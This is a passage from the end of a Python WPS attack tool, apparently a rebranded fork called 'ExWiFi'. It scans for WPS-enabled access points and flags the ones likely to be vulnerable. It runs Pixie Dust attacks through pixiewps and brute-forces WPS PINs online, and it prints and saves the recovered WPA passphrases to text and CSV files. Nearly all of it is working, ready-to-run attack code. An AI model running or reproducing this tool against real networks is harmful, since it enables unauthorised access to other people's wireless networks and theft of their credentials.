                    self.connection_status.essid = codecs.decode("'".join(line.split("'")[1:-1]), 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')
                ModernUI.print_status('Authenticating…', 'info')
            elif 'Authentication response' in line:
                ModernUI.print_status('Authenticated', 'success')
            elif 'Trying to associate with' in line:
                self.connection_status.status = 'associating'
                if 'SSID' in line:
                    self.connection_status.essid = codecs.decode("'".join(line.split("'")[1:-1]), 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')
                ModernUI.print_status('Associating with AP…', 'info')
            elif ('Associated with' in line) and (self.interface in line):
                bssid = line.split()[-1].upper()
                if self.connection_status.essid:
                    ModernUI.print_status(f'Associated with {bssid} (ESSID: {self.connection_status.essid})', 'success')
                else:
                    ModernUI.print_status(f'Associated with {bssid}', 'success')
            elif 'EAPOL: txStart' in line:
                self.connection_status.status = 'eapol_start'
                ModernUI.print_status('Sending EAPOL Start…', 'info')
            elif 'EAP entering state IDENTITY' in line:
                ModernUI.print_status('Received Identity Request', 'info')
            elif 'using real identity' in line:
                ModernUI.print_status('Sending Identity Response…', 'info')

            return True
            
        except Exception as e:
            logger.error(f"Error handling wpa_supplicant output: {e}")
            return False

    def __runPixiewps(self, showcmd=False, full_range=False):
        """Run Pixiewps with enhanced error handling"""
        try:
            ModernUI.print_status("Running Pixiewps…", 'info')
            cmd = self.pixie_creds.get_pixie_cmd(full_range)
            if showcmd:
                print(cmd)
            r = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE,
                               stderr=sys.stdout, encoding='utf-8', errors='replace')
            print(r.stdout)
            if r.returncode == 0:
                lines = r.stdout.splitlines()
                for line in lines:
                    if ('[+]' in line) and ('WPS pin' in line):
                        pin = line.split(':')[-1].strip()
                        if pin == '<empty>':
                            pin = "''"
                        return pin
            return False
        except Exception as e:
            logger.error(f"Error running Pixiewps: {e}")
            return False

    def __credentialPrint(self, wps_pin=None, wpa_psk=None, essid=None):
        """Enhanced credential printing with better formatting"""
        print(f"\n{Colors.BOLD}{Colors.OKGREEN}═══════════ CREDENTIALS FOUND ═══════════{Colors.ENDC}")
        print(f"{Colors.OKGREEN}[+] WPS PIN: '{wps_pin}'{Colors.ENDC}")
        print(f"{Colors.OKGREEN}[+] WPA PSK: '{wpa_psk}'{Colors.ENDC}")
        print(f"{Colors.OKGREEN}[+] AP SSID: '{essid}'{Colors.ENDC}")
        print(f"{Colors.BOLD}{Colors.OKGREEN}═══════════════════════════════════════════{Colors.ENDC}\n")

    def __saveResult(self, bssid, essid, wps_pin, wpa_psk):
        """Save results with enhanced error handling"""
        try:
            if not os.path.exists(self.reports_dir):
                os.makedirs(self.reports_dir, exist_ok=True)
            filename = self.reports_dir + 'stored'
            dateStr = datetime.now().strftime("%d.%m.%Y %H:%M")
            
            # Save to text file
            with open(filename + '.txt', 'a', encoding='utf-8') as file:
                file.write('{}\nBSSID: {}\nESSID: {}\nWPS PIN: {}\nWPA PSK: {}\n\n'.format(
                            dateStr, bssid, essid, wps_pin, wpa_psk
                        )
                )
            
            # Save to CSV file
            writeTableHeader = not os.path.isfile(filename + '.csv')
            with open(filename + '.csv', 'a', newline='', encoding='utf-8') as file:
                csvWriter = csv.writer(file, delimiter=';', quoting=csv.QUOTE_ALL)
                if writeTableHeader:
                    csvWriter.writerow(['Date', 'BSSID', 'ESSID', 'WPS PIN', 'WPA PSK'])
                csvWriter.writerow([dateStr, bssid, essid, wps_pin, wpa_psk])
            
            ModernUI.print_status(f'Credentials saved to {filename}.txt, {filename}.csv', 'success')
            
        except Exception as e:
            logger.error(f"Failed to save results: {e}")
            ModernUI.print_status(f'Failed to save results: {e}', 'error')

    def __savePin(self, bssid, pin):
        """Save PIN with enhanced error handling"""
        try:
            filename = self.pixiewps_dir + '{}.run'.format(bssid.replace(':', '').upper())
            with open(filename, 'w') as file:
                file.write(pin)
            ModernUI.print_status(f'PIN saved in {filename}', 'info')
        except Exception as e:
            logger.error(f"Failed to save PIN: {e}")

    def __prompt_wpspin(self, bssid):
        """Enhanced PIN prompt with better UI"""
        try:
            pins = self.generator.getSuggested(bssid)
            if len(pins) > 1:
                print(f'\n{Colors.BOLD}PINs generated for {bssid}:{Colors.ENDC}')
                print(f'{Colors.OKCYAN}{"#":<3} {"PIN":<10} {"Name":<}{Colors.ENDC}')
                for i, pin in enumerate(pins):
                    number = f'{i + 1})'
                    line = f'{number:<3} {pin["pin"]:<10} {pin["name"]:<}'
                    print(line)
                while True:
                    try:
                        pinNo = input(f'\n{Colors.OKGREEN}Select the PIN: {Colors.ENDC}')
                        if int(pinNo) in range(1, len(pins)+1):
                            pin = pins[int(pinNo) - 1]['pin']
                            break
                        else:
                            ModernUI.print_status('Invalid number', 'error')
                    except ValueError:
                        ModernUI.print_status('Invalid input', 'error')
            elif len(pins) == 1:
                pin = pins[0]
                ModernUI.print_status(f'The only probable PIN is selected: {pin["name"]}', 'info')
                pin = pin['pin']
            else:
                return None
            return pin
        except Exception as e:
            logger.error(f"Error prompting for WPS PIN: {e}")
            return None

    def __wps_connection(self, bssid, pin, pixiemode=False, verbose=None):
        """Enhanced WPS connection with better error handling"""
        if not verbose:
            verbose = self.print_debug
            
        try:
            self.pixie_creds.clear()
            self.connection_status.clear()
            self.wpas.stdout.read(300)   # Clean the pipe
            ModernUI.print_status(f"Trying PIN '{pin}'…", 'info')
            
            r = self.sendAndReceive(f'WPS_REG {bssid} {pin}')
            if 'OK' not in r:
                self.connection_status.status = 'WPS_FAIL'
                if r == 'UNKNOWN COMMAND':
                    ModernUI.print_status('It looks like your wpa_supplicant is compiled without WPS protocol support. Please build wpa_supplicant with WPS support ("CONFIG_WPS=y")', 'error')
                else:
                    ModernUI.print_status('Something went wrong — check out debug log', 'error')
                return False

            while True:
                res = self.__handle_wpas(pixiemode=pixiemode, verbose=verbose)
                if not res:
                    break
                if self.connection_status.status == 'WSC_NACK':
                    break
                elif self.connection_status.status == 'GOT_PSK':
                    break
                elif self.connection_status.status == 'WPS_FAIL':
                    break

            self.sendOnly('WPS_CANCEL')
            return False
            
        except Exception as e:
            logger.error(f"Error in WPS connection: {e}")
            return False

    def single_connection(self, bssid, pin=None, pixiemode=False, showpixiecmd=False,
                          pixieforce=False, store_pin_on_fail=False):
        """Enhanced single connection with better error handling"""
        try:
            if not pin:
                if pixiemode:
                    try:
                        # Try using the previously calculated PIN
                        filename = self.pixiewps_dir + '{}.run'.format(bssid.replace(':', '').upper())
                        with open(filename, 'r') as file:
                            t_pin = file.readline().strip()
                            if input(f'{Colors.OKGREEN}[?] Use previously calculated PIN {t_pin}? [n/Y] {Colors.ENDC}').lower() != 'n':
                                pin = t_pin
                            else:
                                raise FileNotFoundError
                    except FileNotFoundError:
                        pin = self.generator.getLikely(bssid) or '12345670'
                else:
                    # If not pixiemode, ask user to select a pin from the list
                    pin = self.__prompt_wpspin(bssid) or '12345670'

            if store_pin_on_fail:
                try:
                    self.__wps_connection(bssid, pin, pixiemode)
                except KeyboardInterrupt:
                    ModernUI.print_status("Aborting…", 'warning')
                    self.__savePin(bssid, pin)
                    return False
            else:
                self.__wps_connection(bssid, pin, pixiemode)

            if self.connection_status.status == 'GOT_PSK':
                self.__credentialPrint(pin, self.connection_status.wpa_psk, self.connection_status.essid)
                if self.save_result:
                    self.__saveResult(bssid, self.connection_status.essid, pin, self.connection_status.wpa_psk)
                # Try to remove temporary PIN file
                filename = self.pixiewps_dir + '{}.run'.format(bssid.replace(':', '').upper())
                try:
                    os.remove(filename)
                except FileNotFoundError:
                    pass
                return True
            elif pixiemode:
                if self.pixie_creds.got_all():
                    pin = self.__runPixiewps(showpixiecmd, pixieforce)
                    if pin:
                        return self.single_connection(bssid, pin, pixiemode=False, store_pin_on_fail=True)
                    return False
                else:
                    ModernUI.print_status('Not enough data to run Pixie Dust attack', 'error')
                    return False
            else:
                if store_pin_on_fail:
                    # Saving Pixiewps calculated PIN if can't connect
                    self.__savePin(bssid, pin)
                return False
                
        except Exception as e:
            logger.error(f"Error in single connection: {e}")
            return False

    def __first_half_bruteforce(self, bssid, f_half, delay=None):
        """Enhanced first half bruteforce with better progress tracking"""
        checksum = self.generator.checksum
        total_attempts = 10000 - int(f_half)
        current_attempt = 0
        
        while int(f_half) < 10000:
            current_attempt += 1
            t = int(f_half + '000')
            pin = '{}000{}'.format(f_half, checksum(t))
            
            # Show progress
            if current_attempt % 10 == 0:
                ModernUI.print_progress(current_attempt, total_attempts, "First Half Bruteforce")
            
            self.single_connection(bssid, pin)
            if self.connection_status.isFirstHalfValid():
                ModernUI.print_status('First half found', 'success')
                return f_half
            elif self.connection_status.status == 'WPS_FAIL':
                ModernUI.print_status('WPS transaction failed, re-trying last pin', 'warning')
                return self.__first_half_bruteforce(bssid, f_half)
            f_half = str(int(f_half) + 1).zfill(4)
            self.bruteforce.registerAttempt(f_half)
            if delay:
                time.sleep(delay)
        ModernUI.print_status('First half not found', 'error')
        return False

    def __second_half_bruteforce(self, bssid, f_half, s_half, delay=None):
        """Enhanced second half bruteforce with better progress tracking"""
        checksum = self.generator.checksum
        total_attempts = 1000 - int(s_half)
        current_attempt = 0
        
        while int(s_half) < 1000:
            current_attempt += 1
            t = int(f_half + s_half)
            pin = '{}{}{}'.format(f_half, s_half, checksum(t))
            
            # Show progress
            if current_attempt % 10 == 0:
                ModernUI.print_progress(current_attempt, total_attempts, "Second Half Bruteforce")
            
            self.single_connection(bssid, pin)
            if self.connection_status.last_m_message > 6:
                return pin
            elif self.connection_status.status == 'WPS_FAIL':
                ModernUI.print_status('WPS transaction failed, re-trying last pin', 'warning')
                return self.__second_half_bruteforce(bssid, f_half, s_half)
            s_half = str(int(s_half) + 1).zfill(3)
            self.bruteforce.registerAttempt(f_half + s_half)
            if delay:
                time.sleep(delay)
        return False

    def smart_bruteforce(self, bssid, start_pin=None, delay=None):
        """Enhanced smart bruteforce with better session management"""
        try:
            if (not start_pin) or (len(start_pin) < 4):
                # Trying to restore previous session
                try:
                    filename = self.sessions_dir + '{}.run'.format(bssid.replace(':', '').upper())
                    with open(filename, 'r') as file:
                        if input(f'{Colors.OKGREEN}[?] Restore previous session for {bssid}? [n/Y] {Colors.ENDC}').lower() != 'n':
                            mask = file.readline().strip()
                        else:
                            raise FileNotFoundError
                except FileNotFoundError:
                    mask = '0000'
            else:
                mask = start_pin[:7]

            try:
                self.bruteforce = BruteforceStatus()
                self.bruteforce.mask = mask
                if len(mask) == 4:
                    f_half = self.__first_half_bruteforce(bssid, mask, delay)
                    if f_half and (self.connection_status.status != 'GOT_PSK'):
                        self.__second_half_bruteforce(bssid, f_half, '001', delay)
                elif len(mask) == 7:
                    f_half = mask[:4]
                    s_half = mask[4:]
                    self.__second_half_bruteforce(bssid, f_half, s_half, delay)
                raise KeyboardInterrupt
            except KeyboardInterrupt:
                ModernUI.print_status("Aborting…\nStay With\nTeamError", 'warning')
                filename = self.sessions_dir + '{}.run'.format(bssid.replace(':', '').upper())
                with open(filename, 'w') as file:
                    file.write(self.bruteforce.mask)
                ModernUI.print_status(f'Session saved in {filename}', 'info')
                if args.loop:
                    raise KeyboardInterrupt
                    
        except Exception as e:
            logger.error(f"Error in smart bruteforce: {e}")

    def cleanup(self):
        """Enhanced cleanup with better error handling"""
        try:
            if hasattr(self, 'retsock'):
                self.retsock.close()
            if hasattr(self, 'wpas'):
                self.wpas.terminate()
            if hasattr(self, 'res_socket_file') and os.path.exists(self.res_socket_file):
                os.remove(self.res_socket_file)
            if hasattr(self, 'tempdir') and os.path.exists(self.tempdir):
                shutil.rmtree(self.tempdir, ignore_errors=True)
            if hasattr(self, 'tempconf') and os.path.exists(self.tempconf):
                os.remove(self.tempconf)
        except Exception as e:
            logger.error(f"Error during cleanup: {e}")

    def __del__(self):
        self.cleanup()


class EnhancedWiFiScanner:
    """Enhanced WiFi scanner with better error handling and modern features"""
    
    def __init__(self, interface, vuln_list=None, config=None):
        self.interface = interface
        self.vuln_list = vuln_list or []
        self.config = config or ConfigurationManager()

        # Load stored results with better error handling
        reports_fname = os.path.dirname(os.path.realpath(__file__)) + '/reports/stored.csv'
        try:
            with open(reports_fname, 'r', newline='', encoding='utf-8', errors='replace') as file:
                csvReader = csv.reader(file, delimiter=';', quoting=csv.QUOTE_ALL)
                # Skip header
                next(csvReader)
                self.stored = []
                for row in csvReader:
                    if len(row) >= 3:
                        self.stored.append(
                            (
                                row[1],   # BSSID
                                row[2]    # ESSID
                            )
                        )
        except FileNotFoundError:
            self.stored = []
        except Exception as e:
            logger.error(f"Error loading stored results: {e}")
            self.stored = []

    def iw_scanner(self) -> Dict[int, dict]:
        """Enhanced parsing of iw scan results with better error handling"""
        try:
            def handle_network(line, result, networks):
                networks.append(
                        {
                            'Security type': 'Unknown',
                            'WPS': False,
                            'WPS locked': False,
                            'Model': '',
                            'Model number': '',
                            'Device name': ''
                         }
                    )
                networks[-1]['BSSID'] = result.group(1).upper()

            def handle_essid(line, result, networks):
                try:
                    d = result.group(1)
                    networks[-1]['ESSID'] = codecs.decode(d, 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')
                except Exception as e:
                    logger.warning(f"Error decoding ESSID: {e}")
                    networks[-1]['ESSID'] = 'Unknown'

            def handle_level(line, result, networks):
                try:
                    networks[-1]['Level'] = int(float(result.group(1)))
                except ValueError:
                    networks[-1]['Level'] = 0

            def handle_securityType(line, result, networks):
                sec = networks[-1]['Security type']
                if result.group(1) == 'capability':
                    if 'Privacy' in result.group(2):
                        sec = 'WEP'
                    else:
                        sec = 'Open'
                elif sec == 'WEP':
                    if result.group(1) == 'RSN':
                        sec = 'WPA2'
                    elif result.group(1) == 'WPA':
                        sec = 'WPA'
                elif sec == 'WPA':
                    if result.group(1) == 'RSN':
                        sec = 'WPA/WPA2'
                elif sec == 'WPA2':
                    if result.group(1) == 'WPA':
                        sec = 'WPA/WPA2'
                networks[-1]['Security type'] = sec

            def handle_wps(line, result, networks):
                networks[-1]['WPS'] = result.group(1)

            def handle_wpsLocked(line, result, networks):
                try:
                    flag = int(result.group(1), 16)
                    if flag:
                        networks[-1]['WPS locked'] = True
                except ValueError:
                    pass

            def handle_model(line, result, networks):
                try:
                    d = result.group(1)
                    networks[-1]['Model'] = codecs.decode(d, 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')
                except Exception as e:
                    logger.warning(f"Error decoding model: {e}")

            def handle_modelNumber(line, result, networks):
                try:
                    d = result.group(1)
                    networks[-1]['Model number'] = codecs.decode(d, 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')
                except Exception as e:
                    logger.warning(f"Error decoding model number: {e}")

            def handle_deviceName(line, result, networks):
                try:
                    d = result.group(1)
                    networks[-1]['Device name'] = codecs.decode(d, 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')
                except Exception as e:
                    logger.warning(f"Error decoding device name: {e}")

            cmd = f'iw dev {self.interface} scan'
            proc = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE,
                                  stderr=subprocess.STDOUT, encoding='utf-8', errors='replace')
            
            if proc.returncode != 0:
                ModernUI.print_status(f"iw scan failed: {proc.stdout}", 'error')
                return False
                
            lines = proc.stdout.splitlines()
            networks = []
            matchers = {
                re.compile(r'BSS (\S+)( )?\(on \w+\)'): handle_network,
                re.compile(r'SSID: (.*)'): handle_essid,
                re.compile(r'signal: ([+-]?([0-9]*[.])?[0-9]+) dBm'): handle_level,
                re.compile(r'(capability): (.+)'): handle_securityType,
                re.compile(r'(RSN):\t [*] Version: (\d+)'): handle_securityType,
                re.compile(r'(WPA):\t [*] Version: (\d+)'): handle_securityType,
                re.compile(r'WPS:\t [*] Version: (([0-9]*[.])?[0-9]+)'): handle_wps,
                re.compile(r' [*] AP setup locked: (0x[0-9]+)'): handle_wpsLocked,
                re.compile(r' [*] Model: (.*)'): handle_model,
                re.compile(r' [*] Model Number: (.*)'): handle_modelNumber,
                re.compile(r' [*] Device name: (.*)'): handle_deviceName
            }

            for line in lines:
                if line.startswith('command failed:'):
                    ModernUI.print_status(f"Error: {line}", 'error')
                    return False
                line = line.strip('\t')
                for regexp, handler in matchers.items():
                    res = re.match(regexp, line)
                    if res:
                        handler(line, res, networks)

            # Filtering non-WPS networks
            networks = list(filter(lambda x: bool(x['WPS']), networks))
            if not networks:
                ModernUI.print_status('No WPS networks found', 'warning')
                return False

            # Sorting by signal level
            networks.sort(key=lambda x: x['Level'], reverse=True)

            # Putting a list of networks in a dictionary, where each key is a network number in list of networks
            network_list = {(i + 1): network for i, network in enumerate(networks)}

            # Enhanced printing of scanning results as table
            def truncateStr(s, length, postfix='…'):
                """
                Truncate string with the specified length
                @s — input string
                @length — length of output string
                """
                if len(s) > length:
                    k = length - len(postfix)
                    s = s[:k] + postfix
                return s

            def colored(text, color=None):
                """Returns colored text"""
                if color:
                    if color == 'green':
                        text = f'{Colors.OKGREEN}{text}{Colors.ENDC}'
                    elif color == 'red':
                        text = f'{Colors.FAIL}{text}{Colors.ENDC}'
                    elif color == 'yellow':
                        text = f'{Colors.WARNING}{text}{Colors.ENDC}'
                    else:
                        return text
                else:
                    return text
                return text

            if self.vuln_list:
                print(f'{Colors.BOLD}Network marks: {Colors.OKGREEN}Possibly vulnerable{Colors.ENDC} | {Colors.FAIL}WPS locked{Colors.ENDC} | {Colors.WARNING}Already stored{Colors.ENDC}{Colors.ENDC}')
            
            print(f'\n{Colors.BOLD}Networks list:{Colors.ENDC}')
            print(f'{Colors.OKCYAN}{"#":<4} {"BSSID":<18} {"ESSID":<25} {"Sec.":<8} {"PWR":<4} {"WSC device name":<27} {"WSC model":<}{Colors.ENDC}')

            network_list_items = list(network_list.items())
            if args.reverse_scan:
                network_list_items = network_list_items[::-1]
            for n, network in network_list_items:
                number = f'{n})'
                model = '{} {}'.format(network['Model'], network['Model number'])
                essid = truncateStr(network['ESSID'], 25)
                deviceName = truncateStr(network['Device name'], 27)
                line = f'{number:<4} {network["BSSID"]:<18} {essid:<25} {network["Security type"]:<8} {network["Level"]:<4} {deviceName:<27} {model:<}'
                
                if (network['BSSID'], network['ESSID']) in self.stored:
                    print(colored(line, color='yellow'))
                elif network['WPS locked']:
                    print(colored(line, color='red'))
                elif self.vuln_list and (model in self.vuln_list):
                    print(colored(line, color='green'))
                else:
                    print(line)

            return network_list
            
        except Exception as e:
            logger.error(f"Error in iw_scanner: {e}")
            ModernUI.print_status(f"Error scanning networks: {e}", 'error')
            return False

    def prompt_network(self) -> str:
        """Enhanced network prompt with better error handling"""
        try:
            networks = self.iw_scanner()
            if not networks:
                ModernUI.print_status('No WPS Networks Found.', 'warning')
                return None
                
            while True:
                try:
                    networkNo = input(f'{Colors.OKGREEN}Select Target (Press Enter to Refresh)↩ {Colors.ENDC}')
                    if networkNo.lower() in ('r', '0', ''):
                        return self.prompt_network()
                    elif int(networkNo) in networks.keys():
                        return networks[int(networkNo)]['BSSID']
                    else:
                        raise IndexError
                except (ValueError, IndexError):
                    ModernUI.print_status('Wrong Input', 'error')
                except Exception as e:
                    logger.error(f"Error in network prompt: {e}")
                    ModernUI.print_status('Error selecting network', 'error')
                    return None
                    
        except Exception as e:
            logger.error(f"Error in prompt_network: {e}")
            return None

def ifaceUp(iface, down=False):
    """Enhanced interface management with better error handling"""
    try:
        action = 'down' if down else 'up'
        cmd = f'ip link set {iface} {action}'
        res = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        if res.returncode == 0:
            return True
        else:
            ModernUI.print_status(f"Failed to {action} interface {iface}: {res.stderr.decode()}", 'error')
            return False
    except Exception as e:
        logger.error(f"Error managing interface {iface}: {e}")
        return False

def die(msg):
    """Enhanced error handling with logging"""
    logger.error(msg)
    ModernUI.print_status(msg, 'error')
    sys.exit(1)

def usage():
    """Enhanced usage information"""
    return f"""
{Colors.BOLD}ExWiFi - Advanced WiFi Security Testing Tool{Colors.ENDC}
{Colors.OKCYAN}Enhanced Edition 2024 - Code by ErrorX{Colors.ENDC}

{Colors.BOLD}Usage:{Colors.ENDC}
    %(prog)s <arguments>

{Colors.BOLD}Required arguments:{Colors.ENDC}
    -i, --interface=<wlan0>  : Name of the interface to use

{Colors.BOLD}Optional arguments:{Colors.ENDC}
    -b, --bssid=<mac>        : BSSID of the target AP
    -p, --pin=<wps pin>      : Use the specified pin (arbitrary string or 4/8 digit pin)
    -K, --pixie-dust         : Run Pixie Dust attack
    -B, --bruteforce         : Run online bruteforce attack

{Colors.BOLD}Advanced arguments:{Colors.ENDC}
    -d, --delay=<n>          : Set the delay between pin attempts [0]
    -w, --write              : Write AP credentials to the file on success
    -F, --pixie-force        : Run Pixiewps with --force option (bruteforce full range)
    -X, --show-pixie-cmd     : Always print Pixiewps command
    --vuln-list=<filename>   : Use custom file with vulnerable devices list ['vulnwsc.txt']
    --iface-down             : Down network interface when the work is finished
    -l, --loop               : Run in a loop
    -r, --reverse-scan       : Reverse order of networks in the list of networks. Useful on small displays
    -v, --verbose            : Verbose output

{Colors.BOLD}Example:{Colors.ENDC}
    %(prog)s -i wlan0 -b 00:90:4C:C1:AC:21 -K
"""

def main():
    """Enhanced main function with better error handling and modern UI"""
    try:
        # Clear screen and show banner
        os.system('cls||clear')
        ModernUI.print_banner()
        
        # Parse arguments
        parser = argparse.ArgumentParser(
            description='ExWiFi - Advanced WiFi Security Testing Tool (Enhanced Edition 2024)',
            epilog='Example: %(prog)s -i wlan0 -b 00:90:4C:C1:AC:21 -K',
            formatter_class=argparse.RawDescriptionHelpFormatter
        )

        parser.add_argument(
            '-i', '--interface',
            type=str,
            required=True,
            help='Name of the interface to use'
        )
        parser.add_argument(
            '-b', '--bssid',
            type=str,
            help='BSSID of the target AP'
        )
        parser.add_argument(
            '-p', '--pin',
            type=str,
            help='Use the specified pin (arbitrary string or 4/8 digit pin)'
        )
        parser.add_argument(
            '-K', '--pixie-dust',
            action='store_true',
            help='Run Pixie Dust attack'
        )
        parser.add_argument(
            '-F', '--pixie-force',
            action='store_true',
            help='Run Pixiewps with --force option (bruteforce full range)'
        )
        parser.add_argument(
            '-X', '--show-pixie-cmd',
            action='store_true',
            help='Always print Pixiewps command'
        )
        parser.add_argument(
            '-B', '--bruteforce',
            action='store_true',
            help='Run online bruteforce attack'
        )
        parser.add_argument(
            '-d', '--delay',
            type=float,
            help='Set the delay between pin attempts'
        )
        parser.add_argument(
            '-w', '--write',
            action='store_true',
            help='Write credentials to the file on success'
        )
        parser.add_argument(
            '--iface-down',
            action='store_true',
            help='Down network interface when the work is finished'
        )
        parser.add_argument(
            '--vuln-list',
            type=str,
            default=os.path.dirname(os.path.realpath(__file__)) + '/vulnwsc.txt',
            help='Use custom file with vulnerable devices list'
        )
        parser.add_argument(
            '-l', '--loop',
            action='store_true',
            help='Run in a loop'
        )
        parser.add_argument(
            '-r', '--reverse-scan',
            action='store_true',
            help='Reverse order of networks in the list of networks. Useful on small displays'
        )
        parser.add_argument(
            '-v', '--verbose',
            action='store_true',
            help='Verbose output'
        )

        global args
        args = parser.parse_args()

        # Enhanced validation
        if sys.hexversion < 0x03060F0:
            die("The program requires Python 3.6 and above")
        if os.getuid() != 0:
            die("Run it as root")

        # Initialize configuration
        config = ConfigurationManager()
        
        # Set up interface
        if not ifaceUp(args.interface):
            die(f'Unable to up interface "{args.interface}"')

        # Set up signal handlers for graceful shutdown
        def signal_handler(signum, frame):
            ModernUI.print_status("Received interrupt signal, shutting down gracefully...", 'warning')
            sys.exit(0)
        
        signal.signal(signal.SIGINT, signal_handler)
        signal.signal(signal.SIGTERM, signal_handler)

        # Main execution loop
        while True:
            try:
                if not args.bssid:
                    try:
                        with open(args.vuln_list, 'r', encoding='utf-8') as file:
                            vuln_list = file.read().splitlines()
                    except FileNotFoundError:
                        ModernUI.print_status(f"Vulnerable devices list file not found: {args.vuln_list}", 'warning')
                        vuln_list = []
                    except Exception as e:
                        logger.error(f"Error reading vuln list: {e}")
                        vuln_list = []
                        
                    scanner = EnhancedWiFiScanner(args.interface, vuln_list, config)
                    if not args.loop:
                        ModernUI.print_status('BSSID not specified (--bssid) — scanning for available networks', 'info')
                    args.bssid = scanner.prompt_network()

                if args.bssid:
                    companion = EnhancedCompanion(args.interface, args.write, print_debug=args.verbose, config=config)
                    if args.bruteforce:
                        companion.smart_bruteforce(args.bssid, args.pin, args.delay)
                    else:
                        companion.single_connection(args.bssid, args.pin, args.pixie_dust,
                                                    args.show_pixie_cmd, args.pixie_force)
                if not args.loop:
                    break
                else:
                    args.bssid = None
            except KeyboardInterrupt:
                if args.loop:
                    if input(f"\n{Colors.OKGREEN}[?] Exit the script (otherwise continue to AP scan)? [N/y] {Colors.ENDC}").lower() == 'y':
                        ModernUI.print_status("Aborting…\nStay With\nErrorX", 'warning')
                        break
                    else:
                        args.bssid = None
                else:
                    ModernUI.print_status("\n𝙀𝙭𝙞𝙩 𝙁𝙧𝙤𝙢 𝙎𝙘𝙧𝙞𝙥𝙩....\n➢sᴛᴀʏ ᴡɪᴛʜ EʀʀᴏʀX™", 'warning')
                    break
            except Exception as e:
                logger.error(f"Unexpected error in main loop: {e}")
                ModernUI.print_status(f"Unexpected error: {e}", 'error')
                break

        # Cleanup
        if args.iface_down:
            ifaceUp(args.interface, down=True)
            
    except Exception as e:
        logger.error(f"Critical error in main: {e}")
        ModernUI.print_status(f"Critical error: {e}", 'error')
        sys.exit(1)

if __name__ == '__main__':
    main()
